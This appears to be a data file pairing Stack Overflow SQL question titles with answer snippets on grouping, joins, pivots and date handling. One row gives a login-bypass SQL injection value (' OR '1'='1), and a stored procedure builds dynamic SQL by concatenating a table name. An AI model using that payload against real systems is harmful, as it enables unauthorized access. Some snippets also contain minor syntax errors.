          select patientid,location, indatetime, outdatetime,
            sum(IsStart) over (partition by patientid order by indatetime) as Grp
          from (
            select *,
             case when isnull(lag(Location) over (partition by patientid order by indatetime),'dummy') != location then 1 else 0 end as IsStart
            from table1 a
            where (location = 'x' or exists (select 1 from table1 b where a.patientid = b.patientid and b.location = 'x' and b.indatetime < a.indatetime))
          ) z
        ) c group by patientid, location, grp
      ) a where not (location = 'y' and datediff(minute, indatetime, outdatetime) > 48*60)
    ) X
  ) Y
) Z
group by patientid, GRP
order by patientid, indatetime
"
32879,57826,Access SQL database - ORDER BY,"ORDER BY Val(MasterPNo)
"
29280,12985,How to convert minutes (smallInt) to Datetime in SQL Server,"dateadd(minute, @duration, getdate())
"
219,37560,Database Structure for Application,"Client
 - ClientId (PK)
 - other fields

Cource
 - CourceId (PK)
 - other fields

ClientCourceVisit
 - ClientId (FK)
 - CourceId (FK)
 - other fields
"
13294,37158,chaining statements in dynamic sql in oracle,"select 'quote here: ''' , 'double quote'from dual union all
select q'@quote here: ''@', 'q syntax, double quote means two quotes' from dual union all
select q'@quote here: '@', 'q syntax, no need fou double quotes' from dual union all
select 'two quotes here: ''''', 'same thing to have two quotes' from dual union all
select q'@two quotes here: ''@', 'and two quotes with q syntax ' from dual union all
select q'@this is the delimiter char: @.@', 'the delimiter character can be used wherever in the string' from dual union all
select q'@@delimiter is in the beginning and in the end@@', 'you have to double the delimiter if you want it in the end or beginning' from dual
"
25340,70278,"In T-SQL How Can I Select Up To The 5 Most Recent Rows, Grouped By An Identifier, If They Contain A Specific Value?",";WITH
    TEMP1 AS
    (
        SELECT  tran_code,
                deal_id,
                ROW_NUMBER() OVER (PARTITION BY deal_id ORDER BY tran_date DESC) AS tran_rank
        FROM    TRANSACTIONS
    ),
    TEMP2 AS
    (
        SELECT      tran_code,
                    deal_id,
                    tran_rank
        FROM        TEMP1
        WHERE       tran_rank = 1         -- last transaction for a deal
                AND tran_code = 'ACHFAIL' -- failed transactions only
        UNION ALL
        SELECT      curr.tran_code,
                    curr.deal_id,
                    curr.tran_rank
        FROM        TEMP1   curr
        INNER JOIN  TEMP2   prev ON curr.deal_id   = prev.deal_id           -- transaction must be for the same deal
                                AND curr.tran_rank = prev.tran_rank + 1     -- must be consecutive
        WHERE       curr.tran_code = 'ACHFAIL'                              -- must have failed
                AND curr.tran_rank <= 5                                     -- up to 5 only
    )

SELECT      t.deal_id,
            ISNULL(MAX(tran_rank),0)   AS FailCount
FROM        TRANSACTIONS  t
LEFT  JOIN  TEMP2         t2 ON t.deal_id = t2.deal_id
GROUP BY    t.deal_id
"
26106,37753,Get the DATE AND TIME data from different tables,"select S.StudentId,
    S.StudentAccountName,
    CASE WHEN Max(D.attemptedondate) >= Max(A.date) THEN Max(D.attemptedondate) 
         ELSE Max(A.date) END
     as MOSTRECENTTIME 
from activitydata A
    join Studentdata S on A.StudentId=s.StudentID
    join Assessmentdata D on S. StudentID =D. StudentID
group by S.StudentId,
    S.StudentAccountName
"
5049,3452,SQL - Only select row that is not duplicated,"SELECT DISTINCT
     T1.MyField1,
     T1.MyField2,
     T1.MyField3,
     T1.MyField4,
     T1.MyField5
FROM
     MyTable T1
LEFT OUTER JOIN MyTable T2 ON
     T2.MyField1 = T1.MyField1 AND
     T2.MyField2 = T1.MyField2 AND
     T2.MyField3 = T1.MyField3 AND
     (
          T2.MyField4 > T1.MyField4 OR
          (
               T2.MyField4 = T1.MyField4 AND
               T2.MyField5 > T1.MyField5
          )
     )
WHERE
     T2.MyField1 IS NULL
"
33637,24356,How to take the top 10 results of a UNION in sql?,"SELECT TOP 10 *
FROM
(
SELECT a_object_ID as [id], 
    a_object_name as [name],
    'A_object' as [Type]
FROM [database].[dbo].[table_a]
WHERE a_object_name LIKE @Search + '%'
UNION ALL
SELECT b_object_ID as [id], 
    b_object_name as [name],
    'B_object' as [Type]
FROM [database].[dbo].[table_b]
WHERE b_object_name LIKE @Search + '%'
) x
ORDER BY [name]
"
13358,8079,Format Timestamp with constant precision,"SQL> DECLARE
  2     t  TIMESTAMP(6);
  3  BEGIN
  4     t := SYSTIMESTAMP;
  5     dbms_output.put_line( TO_CHAR(t, 'FF') );
  6     dbms_output.put_line( TO_CHAR(t, 'FF6') );
  7  END;
  8  /
234771000
234771

PL/SQL procedure successfully completed.
"
7797,58972,How to know whether the created view is valid or not,"select object_name, status from user_objects 
where object_type = 'VIEW' and object_name = 'YOUR_VIEW';
"
12920,64346,Update a column of a table to be a sequence,"update a set c1 = c1_new
from (
  select 
    c1, c2
  , c1_new = row_number() over (order by nullif(c1,c1))
  from dbo.t1
  ) a
"
36839,18801,How to swap values from two fields at the same time in SQL?,"update
    table
set
    animal = case anmial when 'dog' then 'fox' else 'dog' end
where
    animal in ('dog', 'fox')
"
26891,64384,how to group consecutive rows?,";WITH AlarmTimeBuckets
AS 
(
    SELECT       EventStart.Ev_Comment AS StartDateTime 
                ,MIN(COALESCE (EventEnd.Ev_Comment, EventStart.Ev_Comment)) AS EndDateTime
                ,EventStart.Ev_Message As Machine
    FROM         A EventStart 
    INNER JOIN   A EventEnd ON EventStart.Ev_Comment < EventEnd.Ev_Comment AND EventStart.Ev_Custom1 = 'Alarms Scanned' AND EventEnd.Ev_Custom1 = 'Alarms Scanned' AND EventStart.Ev_Message = EventEnd.Ev_Message
    GROUP BY     EventStart.Ev_Message, EventStart.Ev_Comment
),
AlarmsByTimeBucket
AS
(
    SELECT      AlarmTimeBuckets.Machine
               ,AlarmTimeBuckets.StartDateTime
               ,AlarmTimeBuckets.EndDateTime 
               ,Alarm.Ev_Custom1 AS Alarm
               ,(
                 CASE
                    WHEN LAG(AlarmTimeBuckets.EndDateTime, 1, NULL) OVER (PARTITION BY Alarm.Ev_Custom1,Alarm.Ev_Message ORDER BY AlarmTimeBuckets.StartDateTime) = AlarmTimeBuckets.StartDateTime THEN 0
                    ELSE 1
                 END
                ) AS IsNewEvent
    FROM       A Alarm 
    INNER JOIN AlarmTimeBuckets  ON Alarm.Ev_Message = AlarmTimeBuckets.Machine AND  Alarm.Ev_Comment = AlarmTimeBuckets.StartDateTime
    WHERE     (Alarm.Ev_Custom1 <> 'Alarms Scanned')
)
,
AlarmsByGroupingID
AS
(
    SELECT   Machine
            ,StartDateTime
            ,EndDateTime
            ,Alarm
            ,SUM(IsNewEvent) OVER (ORDER BY Machine, Alarm, StartDateTime) AS GroupingID
    FROM    AlarmsByTimeBucket
)
SELECT       MAX(Machine) AS Machine
            ,MIN(StartDateTime) AS StartDateTime
            ,MAX(EndDateTime) AS EndDateTime
            ,MAX(Alarm) AS Alarm
FROM        AlarmsByGroupingID
GROUP BY    GroupingID
ORDER BY    StartDateTime
"
19382,43963,T-SQL Percentage of 2 summed fields Error,"CAST((COUNT(et.NotEnrolled)+COUNT(etne.EmployeeID))*100.0/Count(et.EmployeeID) as numeric (10,2)) as 'Not Enrolled %'
"
36153,49082,does mysql offer append content to the value of a column,"to_id      sender_id     message                       date
22243       22211        blah blah   blah              3/3/2012
22244       22211        blah blah   blah              3/3/2012
22245       22211        blah blah   blah              3/3/2012
"
22572,37250,"Modelling a ""one to one or two"" relationship","CHECK(PERSON_NO = 1 OR PERSON_NO = 2)
"
24147,22166,Access query not using index,"SELECT Min(HostName) FROM HostsRev WHERE HostName >= ""test""
"
4233,40018,Trigger to Update value in mysql table,"CREATE TRIGGER `before_insert_products_extra_fields` 
BEFORE INSERT ON `products_extra_fields` FOR EACH ROW 
BEGIN
    IF(NEW.name = 'color') THEN
        SET NEW.value = CASE 
            WHEN NEW.value LIKE '%red%' THEN 'red'
            WHEN NEW.value LIKE '%blue%' THEN 'blue'
            ...
            ELSE 'other'
        END;
    END IF;
END
"
14125,1645,Adding an additional column to SQL UNION SELECT,"select x.*, g.name
from group g join
(
SELECT
tc.""cID"" AS ""accID"",
tc.""name"" AS ""accName"",
tbt.""gID""
FROM ""tblContact"" tc
INNER JOIN ""tblBelongsTo"" tbt
ON tbt.""accID"" = tc.""cID""
UNION 
SELECT
tu.""uID"" AS ""accID"",
CONCAT (tu.""fname"", ' ', tu.""sname"") AS ""accName"",
tbt.""gID""
FROM ""tblUser"" tu
INNER JOIN ""tblBelongsTo"" tbt
ON tbt.""accID"" = tu.""uID""
) x on x.gid = g.gid
order by accid;
"
6831,43301,How to count the duplicate column values in sql,"select myid, 'Review' as col1, count(myid) as col3
from testsql1
group by myid;
"
16260,37776,"How to query a neighbor vertex, which has certain attributes?","create class User extends V
create property User.username string
create property User.password string

create class UserGroup extends V
create property UserGroup.id string

create class user_group extends E


create vertex User set username = 'foo', password = 'bar'
create vertex UserGroup set id = 'group1'

create edge user_group from (select from User where username = 'foo') to (select from UserGroup where id = 'group1')


select expand(in('user_group')[username='foo'][password='bar']) 
from UserGroup
where id = 'group1'
"
13307,46431,Dummy DATE field with NULL value,"select col1, datecol from table1
union all
select col1, null from table2
"
39412,74353,Statictis/aggregation queries: full scan or index or partitioning?,"select id, one_column, another_column
  from two_hundred_mb_table
 where id = 1

select sum(one_column) / sum(another_column) 
  from two_hundred_mb_table
"
38188,22272,How to use index in select statement?,"SELECT *
FROM Table WITH(INDEX(Index_Name))
"
29455,35467,Regarding combining queries into one,"select * 
  from TXN_HEADER 
 inner join TXN_DETAIL 
    on TXN_HEADER.txhd_txn_nr = TXN_DETAIL.txhd_txn_nr
 where TXN_HEADER.txhd_receipt_id = 'receipt_id_val' 
   and TXN_HEADER.till_short_desc = 'till_no_val'
   and TXN_DETAIL.till_short_desc = 'till_no_val'
"
3758,71144,SQL Join - Summing COUNT of Different Values,"select
    o.state_abbr,
    s.state,
    o.[count]
from states s
inner join
(
    select state_abbr, count(*) as count
    from orgs
    group by state_abbr
) o
on s.state_abbr = o.state_abbr
"
15505,33729,Modify Return Value of SELECT-Statement (TSQL) [Optimizing query],"SELECT
   dbo.Nachricht.NachrichtID, dbo.Nachricht.Bezeichnung, 
   CASE WHEN dbo.AdditionalData.BetrifftKontoeinrichtung = 0 
        THEN '0' ELSE '1' 
   END AS BetrifftKontoeinrichtung, 
FROM dbo.Nachricht
INNER JOIN dbo.AdditionalData
        ON dbo.Nachricht.NachrichtID = dbo.AdditionalData.NachrichtID    
WHERE (dbo.Nachricht.NachrichtID in ( 450,439 ))
"
16381,246,Have you ever done SQL injection?,"user: admin
pass: ' OR '1'='1
"
20092,68129,Return a string from a sub query,"SELECT 
    CASE 
        WHEN Committed_Date >= '01/04/2011' THEN 'Y' 
        ELSE 'N' 
    END AS Current_YTD
FROM YourTable
"
9660,22142,SQL Server OR statement with AND,"select * 
from MyTable
where @Param is null or case when @Param is not null and FieldCode = 'Whatever' 
then case when FieldValue like '%' + @Param + '%' then 1 end end = 1
"
20069,58644,MySQL ordering in Select .. In statement,"select id from user where id IN (2, 3, 1) ORDER BY FIELD(id, 2, 3, 1);
"
17761,20044,Concatenate rows based on Group By in SQL server,"SELECT
   JobNo,
   STUFF(
     (SELECT ' ' + Notes
      FROM MyTable
      WHERE JobNo = a.JobNo
      FOR XML PATH (''))
      , 1, 1, '')  AS URLList
FROM MyTable AS a
GROUP BY JobNo
"
31555,5835,An efficient way to write MySql query that has duplicate column names,"SELECT post.post_id, comment.post_id as comment_post_id, *
FROM ...
"
33872,33329,Count 2 columns by the same grouping,"SELECT   `Date`, 
         COUNT(`open`) AS `CountDateOpened`
         COUNT(`closed`) AS `CountDateClosed`
FROM     (SELECT `DateOpened` AS `Date`, 1 AS `open`, NULL AS `closed`
          FROM   `issue`
          UNION ALL
          SELECT `DateClosed` AS `Date`, NULL AS `open`, 1 AS `closed`
          FROM   `issue`
         ) t
GROUP BY `Date`
ORDER BY `Date` DESC
"
20885,72295,"SQL: Getting SQL to ""count"" a number of actions performed within the database"," SELECT EmpNo, LastName, COUNT(OrderNo) AS OrdersHandled
 FROM Employee INNER JOIN Customer ON Employee.EmpNo = Customer.AcctRepNo
 INNER JOIN Orders ON Orders.CustNo = Customer.CustNo
 GROUP BY EmpNo, LastName
"
11703,67197,A column aggregation function that determines if all of the values are equal to a constant in Sybase IQ,"select
  key
  ,sum(case when value = 'pass' then 1 else 0 end) as num_passed
  ,count(*) as num_tests
from mytable
group by key
having num_tests = num_passed
"
21881,58535,Skip output of mysql query if user is blocked,"SELECT 
    tq.question_id,tq.info,tq.owner_id
FROM question as tq
    LEFT JOIN block_user as bu 
         ON tq.question_id = bu.question_id AND bu.block_user_id = '2'
     ..... Other Join .......
     ..... Other Join .......
WHERE tq.is_active = '1'
  AND bu.question_id IS NULL
"
30324,6305,SQL Query to provide me with the total number,"select STATE, count(*) as num from table_name where gender ='MALE' GROUP BY STATE;
"
15097,67018,Find items that are not tagged with the following tags,"select      items.* 
from        items
inner join  (
                select   item_id, count(distinct tag_id) as matches
                from     item_tag
                where    tag_id in (1,2,3)
                group by item_id
            ) as tags_in
        on  tags_in.item_id = items.id
left join  (
                select   item_id
                from     item_tag
                where    tag_id in (4,5,6)
                group by item_id
            ) as tags_out
        on  tags_out.item_id = items.id
where       items.deleted_at is null
        and items.published = 1 
        and items.brand_id = 1 
        and tags_in.matches = 3
        and tags_out.id is null
"
30607,15803,Query to select intervals in day,"SELECT * FROM intervals 
WHERE interval IN (
    SELECT DISTINCT interval FROM intervals WHERE day = 8)
"
34071,58120,Create a count in count in sql select,"SQL> SELECT SUM(val)
  2  FROM  (SELECT Count(*) VAL
  3         FROM   emp
  4         UNION
  5         SELECT Count(*) VAL
  6         FROM   dept);

  SUM(VAL)
----------
        18
"
14176,51126,Checking sql unique value with constraint,"create view dbo.v_YourTable with schemabinding as
select ID
from dbo.YourTable
where [Status] = 1

go

create unique clustered index UX_v_UniTest_ID on v_YourTable(ID)
"
33849,65113,Multiple INNER JOIN subqueries sql,"SELECT
        studid,
        studname,
        status,
        presentcnt,
        status1,
        participatedcnt FROM
(SELECT
        classlist.studentid studid,
        student.name studname,
        classStatus.name status,
        COUNT(*) presentcnt
    FROM
        classlist 
        INNER JOIN student ON classlist.studentid=student.id
        INNER JOIN classstatus ON classlist.presentid=classstatus.id
        INNER JOIN (
            SELECT
                studentid,
                max(CASE WHEN presentid=0 THEN id END)  max_0,
                max(CASE WHEN presentid=1 THEN id END)  max_1
            FROM classlist
            GROUP BY studentid
        ) s
        ON coalesce(classlist.id>least(max_0,max_1) AND classlist.id<=greatest(max_0,max_1),1) AND s.studentid=classlist.studentid
    GROUP BY classlist.studentid)x
JOIN

(SELECT
        classlist.studentid,
        student.name,
        participatedStatus.name status1,
        COUNT(*) participatedcnt
    FROM
        classlist 
        INNER JOIN student ON classlist.studentid=student.id
        INNER JOIN participatedStatus ON classlist.participatedid=participatedStatus.id
        INNER JOIN (
            SELECT
                studentid,
                max(CASE WHEN participatedid=0 THEN id END)  max_0,
                max(CASE WHEN participatedid=1 THEN id END)  max_1
            FROM classlist
            group by studentid
        ) s
        ON coalesce(classlist.id>least(max_0,max_1) 
        AND classlist.id<=greatest(max_0,max_1),1)
        AND s.studentid=classlist.studentid
    group by classlist.studentid)y
ON x.studid=y.studentid
"
2888,31708,Database structure for multi-level category (Best Approach),"id       title        content       parent_id
==============================================
1        item1         NULL         NULL     
2        item2         NULL         1          
3        item3         abcd         2       
4        item4         efgh         2        
"
6799,61126,Convert a Normal Postgres Database to PostGis Database,"-- Spatially enable the database
CREATE EXTENSION postgis;

-- Spatially enable each table with a geometry column
--      [ also consider using ""geog geography(Point,4326)"" ]
ALTER TABLE mytable ADD COLUMN geom geometry(Point,4326);
UPDATE mytable SET geom = ST_SetSRID(ST_MakePoint(long, lat), 4326);
"
30698,7351,Group By making query astronomically longer,"SELECT
    ...,
    SUM(SalesCost) as SalesCost,
    SUM(SalesDollars) as SalesDollars
FROM
    ...
"
17589,56550,Where clause with switch case or dynamic where,"WHERE s.SupplierName = o.SupplierName 
AND
CASE WHEN @city = 'NY' AND o.Row = 'New' THEN 1
WHEN @city <> 'NY' THEN 1
ELSE 0 END = 1
"
38733,50111,SubSelects for Order and Count,"SELECT 
  Faculty, 
  Department, 
  Season, 
  Student, 
  Score, 
  DENSE_RANK() OVER (PARTITION BY Faculty, Department, Season ORDER BY Score DESC) AS NumberInSeason, 
  COUNT(*) OVER (PARTITION BY Faculty, Department, Season) AS TotalInSeason 
FROM Table
"
12325,11114,How to use curtime() to check in column with now() structure? SQL,"... AND date(date_added) = CURDATE()
"
32131,47429,ON UPDATE CURRENT_TIMESTAMP and JPA,"@Temporal(TemporalType.TIMESTAMP)
@Column(name = ""edit_timestamp"", 
        updatable = false
        columnDefinition=""TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP"")
private Date editTimestamp;
"
24483,37193,SQL Server 2000 - Is there a fast way of deleting backup history?,"EXEC sp_delete_backuphistory '2000-01-01'
EXEC sp_delete_backuphistory '2001-01-01'
EXEC sp_delete_backuphistory '2002-01-01'
...
"
2066,28371,how to define sqlalchemy orm models for difficult logic,"from sqlalchemy import orm

class Post(Base):
    ...
    tags = orm.relationship('Tag',
        primaryjoin='and_(ItemTag.tag_id==Tag.tag_id, ItemTag.item_id==Post.post_id, ItemTag.item_type_id==1)')
"
12006,47258,MySQL Get results from multiple tables based on a date,"(SELECT name, 'passport', expiry_date FROM table_passport WHERE ...) 
UNION ALL 
(SELECT name, 'vaccination', expiry_date FROM table_vaccinations WHERE ...) 
UNION ALL 
(SELECT name, 'medical', expiry_date FROM table_medical WHERE ...) 
ORDER BY name;
"
29269,34617,Aggregate function checking 'if contains',"select code,
max(case when page = '999' then 1 else 0 end) as has999
from table
group by code
"
19483,3225,How to replace duplicate words in a column with just one word in SQL Server,"WHILE EXISTS (SELECT * FROM table WHERE Field LIKE '%\thirdparty\thirdparty\%')
BEGIN
    UPDATE table SET Field = REPLACE(Field, '\thirdparty\thirdparty\', '\thirdparty\')
END
"
19734,42740,Converting colums to row in SQL Server,"select 
    distinct UserName, 
    Question1 AS Question, 
    Opt1 AS OPT, 
    Ans1 AS Comment 
From 
    tblFeedback where Question1='Quest1'
UNION ALL
select 
    distinct UserName, 
    Question2 AS Question, 
    Opt2 AS OPT, 
    Ans2 AS Comment 
From 
    tblFeedback where Question2='Quest2'
"
17353,55628,get the date and time for today at midnight and add to it,"Declare @aDate DateTime
Set @aDate = getDate()
Declare @Minutes Integer
Set @minutes = 600 -- 10 hours

Select DateAdd(day, DateDiff(day, 0, @aDate), 0) + @minutes / 1440.0  -- 1440 min/day
 -- or You could also use the dateadd again...
Select DateAdd(minute, @minutes , DateAdd(day, DateDiff(day, 0, @aDate), 0))
"
11666,50267,How to optimize this IP to Location lookup query?,"UPDATE tracker JOIN city_blocks ON mbrcontains(cb_ip_poly, pointfromwkb(point(inet_aton(track_ip),0))) SET t_loc_id=cb_loc_id
"
10342,20720,SELECT specific columns from EXEC stored procedure,"if OBJECT_ID('SomeProc') is null
    exec ('create procedure dbo.SomeProc as select 1 as SomeValue union all select 2 as SomeValue;')

exec dbo.SomeProc

Select @@ROWCOUNT as RowsAffected
"
7006,1394,Find rows with multiple reference values in MySQL,"select carid
  from tblCarColorXRef
 where colorid in (1,2)
 group by carid
having count(colorid = 2);
"
27321,5579,Dynamically search columns for given table,"CREATE PROCEDURE dbo.SearchTable
    @tablename NVARCHAR(257),
    @term      NVARCHAR(4000)
AS
BEGIN
    SET NOCOUNT ON;

    DECLARE @sql NVARCHAR(MAX);

    SET @sql = N'SELECT * FROM ' + @tablename + ' WHERE 1 = 0'; 

    SELECT @sql = @sql + ' 
      OR ' + c.name + ' LIKE ''%' + REPLACE(@term, '''', '''''') + '%'''
    FROM 
      sys.all_columns AS c
    INNER JOIN 
      sys.types AS t
      ON c.system_type_id = t.system_type_id
      AND c.user_type_id = t.user_type_id
    WHERE 
      c.[object_id] = OBJECT_ID(@tablename)
      AND t.name IN (N'sysname', N'char', N'nchar', 
        N'varchar', N'nvarchar', N'text', N'ntext');

    PRINT @sql;

    -- EXEC sp_executesql @sql;
END
GO
"
2113,65830,Combining two SQL statements with subtraction,"SELECT WOSTO, AREATO, WOSFROM, STATIONFROM
FROM
(
   SELECT DISTINCT CONCAT('0', WADOCO) AS WOSTO, IBSRP4 AS AREATO
      , WOSFROM AS WOSFROM, PWOSFROM AS PWOSFROM, STATIONFROM AS STATIONFROM
   FROM CPJDDTA81.F4801
      , CPJDDTA81.F4102
      ,
      (
         SELECT DISTINCT EVLEV1 AS WOSFROM, EVLAB2 AS PWOSFROM
            , EVLAB1 AS STATIONFROM
         FROM CLOCFILEOT.CKEVNHM2
            ,
            (
               SELECT DISTINCT CONCAT('0', WADOCO) AS WOS
               FROM CPJDDTA81.F4801, CPJDDTA81.F4102
               WHERE IBITM = WAITM
                  AND WASRST IN( '30', '45' )
                  AND IBSRP4 IN( 'ECT' )
                  AND WAMMCU = '      ECT001'
            ) AS SELECTEDWOS
            WHERE EVLEV1 = WOS
               AND EVLAB1 = 'E500'
      ) AS ORIGINALWOS
      WHERE IBITM = WAITM
         AND WAPARS = PWOSFROM
         AND IBSRP4 = 'CAB'
         AND WAMMCU = '      STH001'
) AS SELECTEDWOS
LEFT JOIN CLOCFILEOT.CKEVNHM2 ON SELECTEDWOS.WOSTO = CLOCFILEOT.CKEVNHM2.EVLEV1
WHERE CLOCFILEOT.CKEVNHM2.EVLEV1 IS NULL
"
256,12388,"When accessing a DB2 database via COBOL, how can one set the Isolation Level, Fetch Size, Scroll Type and Concurrency? (among other performance tips)","SELECT * FROM MY.TESTTABLE
WITH UR;  
"
35257,865,I have single row should convert into columns,"-- create table t(NumberOfQuotesGenerated int,TotalAmountOfQuotes int,NumberOfInvoiceGenerated int, TotalAmountOfInvoice int)
-- insert into t values (11, 78100, 9, 8222)

select * from 
(select * from t) s
unpivot
(
   data for 
   colname in 
      ([NumberOfQuotesGenerated],[TotalAmountOfQuotes],[NumberOfInvoiceGenerated],[TotalAmountOfInvoice])
)up
"
2663,46935,Substring with conditional statement,"select substring(stringfield,
                 charindex('/', stringfield, 1),
                 charindex('   ',
                           stringfield,
                           charindex('/', stringfield, 1)) -
                 charindex('/', stringfield, 1)) as val
  from tbl
"
37072,28043,how write update and inner query for multiple records in msql,"UPDATE userstable u
    SET LIKECOUNT = (SELECT SUM(LIKECOUNT) 
                     FROM topicstable t
                     WHERE t.USERID = u.USERID
                   );
"
25863,275,How to join where there is a possibility of no record,"SELECT mv.clientid,
       mv.fundid,
       MAX(CASE WHEN date = '1 may 2010' THEN value ELSE 0 END) as startvalue,
       MAX(CASE WHEN date = '1 may 2011' THEN value ELSE 0 END) as endtvalue
FROM mv
GROUP BY clientid,fundid
"
23100,66268,Getting the most recent autonumber field from another table,"SELECT Max([ID]) FROM [Table]
"
7480,26132,"SQL, multiple rows to one column","SELECT
  ID,
  NAME,
  MAX(CASE WHEN MONTH = 'December2012' THEN ""COUNT"" END) AS ""December2012"",
  MAX(CASE WHEN MONTH = 'January2013'  THEN ""COUNT"" END) AS ""January2013""
FROM Tablename
GROUP BY ID, Name;
"
20223,64426,How to match one and/or more than one 0s in SQL?,"SELECT ID FROM table WHERE REGEXP_LIKE(zeroes, '^0+$')
"
22071,50791,Merging 3 MySQL Tables Into Consolidated Table Getting Too Many Results,"FROM members M INNER JOIN
     products P
     ON P.member_id = M.member_id INNER JOIN
     product_costs PC
     ON PC.member_id = M.member_id AND
        PC.product_id = P.product_id
"
20493,74870,Insert data into database in Android,"public int bulkInsert(@NonNull ContentValues[] values) {
    int insertCount = 0;
    SQLiteDatabase db = mSqlHelper.getWritableDatabase();
    try {
        db.beginTransaction();
        for (ContentValues value : values) {
            if (db.insertOrThrow(tableName, null, value) == -1) {
                throw new Exception(""Unknown error while inserting entry in database."");
            }
            insertCount++;
        }
        db.setTransactionSuccessful();
    } catch (Exception e) {
        Log.e(LOG_TAG, ""An error occurred while bulk-inserting database entries.\n"" + e.getMessage(), e);
    } finally {
        db.endTransaction();
    }
    return insertCount;
}
"
33704,75602,Can I exclude a single SELECT in MSSQL from my WHERE clause?,"SELECT i.prod_cd as product,
       i.descrip as description,
       i.in_stock as current_stock, 
       SUM(p.log_qty) as purchase_order,
       SUM(l.order_qty + e.order_qty) as total_so
from inv_data i left outer join
     plog p
     on i.prod_cd = p.prod_cd and
        dateadd(day, p.EST_DT, '18001228') BETWEEN getdate() and dateadd(day, 14, getdate())
     left outer join
     ord_log l
     on i.prod_cd = l.prod_cd and
        dateadd(day, l.SHIP_DT, '18001228') BETWEEN getdate() and dateadd(day, 14, getdate()) 
     left outer join
     ediordlg e
     on i.prod_cd = e.prod_cd and
        dateadd(day, e.SHIP_DT, '18001228') BETWEEN getdate() and dateadd(day, 14, getdate())
where i.class_cd = 'ALG7'
group by i.prod_cd, i.descrip, i.in_stock,
order by i.prod_cd ASC
"
2696,9808,How to reference an aliased column in where clause that contains a grouping function,"SELECT COUNT(DISTINCT iDomainID) AS totInFile, iFileGroup
FROM Domains.`ApacheVirtualHosts`
GROUP BY iFileGroup
HAVING COUNT(DISTINCT iDomainID) < 10;
"
38298,35426,How to self JOIN recursively in SQL?,"With Family As 
( 
Select s.ID, s.ParentSeriesId, 0 as Depth
From Series s
Where ID = @ParentID 
Union All 
Select s2.ID, s2.ParentSeriesId, Depth + 1
From Series s2
    Join Family 
        On Family.ID = s2.ParentSeriesId 
) 
Select *
From Family 
"
26628,48099,How to join these 2 tables?,"SELECT (sal - (tax * sal)) AS Sal_result
  FROM emp
  JOIN salgrade ON (emp.sal BETWEEN salgrade.lowsal AND salgrade.hisal)
"
34857,10024,How to fillter data from result of sql query in sql,"SELECT Menuid, 
       Text, 
       Parentid, 
       Refcode 
FROM   Menu E1 
WHERE  E1.Refcode IN ( 0, 50, 51, 60, 63, 57 ) 
AND EXISTS
(
    SELECT 1 FROM Menu E2
    WHERE E2.Parentid = E1.Menuid
)
"
2918,15546,Using wildcard in table data,"select id, model
from your_table
where 'dv209AWW' like model
order by id 
"
12944,75510,Select each month between a start and end date,"SELECT generate_series('2010-04-01', '2011-02-01', interval '1 month')::date
"
685,65482,SQL find name doubles and sum values,"select   user_name,
         sum(hours)
from     your_table
group by user_name;
"
580,73033,Oracle APEX Tree Hierarchy Limitations/Issues,"WHERE level <= 3
"
8608,55820,Oracle Show dept_name of records only in deptno 20,"select e.empno, e.ename, d.deptno, d.dname  
  from emp e
  left outer join ( select deptno, dname 
                      from dept 
                     where deptno = 20 )
    on e.deptno = d.deptno
"
35382,21766,"Trac - WHERE statement in SQL lite query is ""false"" for all tuples altough it should not be","SELECT
  id,
  changetime as modified,
  strftime('%s',""now"") as date,
  (strftime('%s',""now"") - changetime / 1000000) as 'DIFF'
FROM ticket
WHERE (CAST(strftime('%s',""now"") AS NUMERIC) - changetime / 1000000) < 86400.0
"
16979,34227,using SELECT INTO with multiple rows,";WITH cte (Col1, Col2, Col3) AS
(
Select 1, 'a','2001-01-01 12:00'
UNION ALL
Select 83, 'z','2011-09-30 13:27'
UNION ALL
Select 777, 'k','1997-04-25 09:27'
)
SELECT *
INTO NewTable
FROM cte
"
28825,27486,SQL query to get columns and records of that columns using like operator,"Select 'KEYWORD' as KEYWORD, 'PART1_D1' as PART1_D1, 'PART1_D2' as PART1_D2, 
  'PART1_D3' as PART1_D3, 'PART1_D4' as PART1_D4, 'PART2_D5' as PART2_D5,
UNION
Select KEYWORD, cast(PART1_D1 as varchar(50), cast(PART1_D2 as varchar(50), 
  cast(PART1_D3 as varchar(50), cast(PART1_D4 as varchar(50), 
  cast(PART2_D5 as varchar(50)
From sample
"
19996,34336,Update and append unless empty,"update myTable 
set  Prefixes = 
           case 
               when Prefixes is null or Prefixes = ''
               then 'abc'
               else convert(nvarchar(max),Prefixes) + ', abc' 
            end
where MyCol='xyz' and (Prefixes not like '%abc%' or Prefixes is null)
"
1958,70441,Can every 2NF relation be made into 3NF relation?,"R(x) = y,
P(x) = z,  => Q(P(x)) = y
Q(z) = y
"
17471,27674,my sql union + limit,"(SELECT a FROM t1 WHERE a=10 AND B=1 ORDER BY a LIMIT 10)
UNION
(SELECT a FROM t2 WHERE a=11 AND B=2 ORDER BY a LIMIT 10);
"
18345,20576,Postgres UPDATE..FROM query with multiple updates on the same row,"UPDATE target dst
Set a = src.a , b = src.b
FROM source src
WHERE src.id = dst.id
AND NOT EXISTS (
        SELECT *
        FROM source nx
        WHERE nx.id = src.id
        -- use an extra key field AS tie-breaker
        AND nx.date_modified > src.date_modified
        );
"
6871,48366,oracle apex report row indent,"select  replace(lpad('#', level*2, '#'),'#','&nbsp;')|| ename as ename
from    emp
start   with mgr is null
connect by nocycle prior empno = mgr
"
4786,62581,"Linq version of SQL ""IN"" statement","var TagIds = new int[] {12, 32, 42};

var q = from map in Context.TagMaps 
        where TagIds.Contains(map.TagId)
        select map.Items;
"
21659,62212,Extract id along with count of other columns,"select customer,SUM(PRODUCTA),SUM(PRODUCTB) 
from rm_saicharan_final6 group by customer
"
22634,23215,Oracle: when was my table modifed?," select scn_to_timestamp(max(ora_rowscn)) from table_name
"
9368,4572,left join with at least one row with condition from right mysql,"SELECT  r.`id`, r.`name`, o.`date`, o.`status`,  o.`id` order_id
FROM    restaurants r
        INNER JOIN orders o 
            ON r.id = o.restaurant_id
            AND o.date BETWEEN '2013-08-10' AND '2013-08-31' 
        INNER JOIN
        (   SELECT  DISTINCT o2.Restaurant_ID
            FROM    orders o2
            WHERE   o2.date BETWEEN '2013-08-10' AND '2013-08-31' 
            AND     o2.Status = 'Reserved'
        ) o2
            ON r.id = o2.restaurant_id;
"
5141,62594,How to execute an Oracle stored procedure via a database link,"EXEC mySchema.myPackage.myProcedure@myRemoteDB( 'someParameter' );
"
9427,22350,Inserting column data from another table together with more value,"Select distinct UserID, FirstName, LastName, EmailAddress, 0, 0, 0, 'Imported'
from TableB
"
